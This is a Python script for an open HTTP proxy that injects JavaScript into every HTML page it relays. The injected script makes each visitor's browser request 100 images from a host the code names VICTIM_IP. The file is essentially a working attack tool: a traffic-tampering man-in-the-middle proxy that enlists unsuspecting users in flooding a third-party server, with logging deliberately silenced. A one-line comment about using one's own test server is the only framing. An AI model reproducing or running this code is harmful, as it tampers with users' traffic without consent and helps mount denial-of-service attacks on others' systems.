import socketserver
import http.server
import socket
import threading

VICTIM_IP = "http://198.51.100.77"  # Replace with your own test server
INJECT_JS = f"""
<script>
  for (let i = 0; i < 100; i++) {{
    let img = new Image();
    img.src = "{VICTIM_IP}/img" + i + ".jpg";
  }}
</script>
"""

class ProxyHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            url = self.path

            # Extract host and port from headers
            if "Host" in self.headers:
                hostname = self.headers["Host"]
                if ':' in hostname:
                    host, port = hostname.split(":")
                    port = int(port)
                else:
                    host = hostname
                    port = 80
            else:
                self.send_error(400, "Bad request: No Host header")
                return

            # Connect to target server
            with socket.create_connection((host, port), timeout=5) as remote_socket:
                remote_socket.sendall(f"GET {url} HTTP/1.0\r\n".encode())
                for header, value in self.headers.items():
                    if header.lower() != "proxy-connection":
                        remote_socket.sendall(f"{header}: {value}\r\n".encode())
                remote_socket.sendall(b"\r\n")

                # Read response
                response = b""
                while True:
                    data = remote_socket.recv(4096)
                    if not data:
                        break
                    response += data

                # Attempt to inject into HTML
                if b"Content-Type: text/html" in response:
                    try:
                        header, body = response.split(b"\r\n\r\n", 1)
                        body = body.replace(b"</body>", INJECT_JS.encode() + b"</body>")
                        response = header + b"\r\n\r\n" + body
                    except Exception as e:
                        print("Injection failed:", e)

                self.wfile.write(response)

        except Exception as e:
            print("Proxy error:", e)
            self.send_error(502, "Bad gateway")

    def log_message(self, format, *args):
        return  # Silence logs

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

def run_proxy(host="0.0.0.0", port=8080):
    server = ThreadedHTTPServer((host, port), ProxyHTTPRequestHandler)
    print(f"[*] Open HTTP Proxy listening on {host}:{port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down proxy.")

if __name__ == "__main__":
    run_proxy()
